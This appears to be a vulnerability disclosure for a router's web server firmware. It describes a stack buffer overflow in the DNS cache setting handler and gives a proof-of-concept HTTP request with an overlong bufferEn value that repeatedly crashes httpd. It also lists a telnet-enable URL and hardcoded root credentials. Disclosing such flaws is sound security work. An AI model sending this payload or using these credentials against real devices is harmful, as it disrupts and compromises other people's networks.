Figure shows the latest firmware of V3：V15.11.0.20.

## Vulnerability details

open telnet  <http://192.168.0.1/goform/telnet>
telnet admin/password is root/Fireitup

using ida to analysis httpd, in function formSetDnsCacheCapacity:

The program passes the contents obtained by the bufferEn parameter to dns_enable.
Then, dns_enable is set to dns.enable stored in the system by function SetValue.  
And dns.enable is passed to old_enable by function GetValue, Old_enable is an array of finite length.
There is no size check, so there is a vulnerability that can cause buffer overflow through bufferEn parameter.

## Vulnerability exploitation condition

Need to get cookie after logging in to execute the attack.

The functional data packets are as follows, and we will use this to construct poc.  

```http
GET /goform/setDnsData?bufferMemory=1000&bufferEn=falseAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1
Host: 192.168.0.252

```

## Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Connect physical devices
2. Attack with the POC

The poc and reproduction results are as follows:

Figure shows POC attack effect, the pid of httpd changed.

And then every visit to this page will cause httpd to crash, as shown in the following figure.
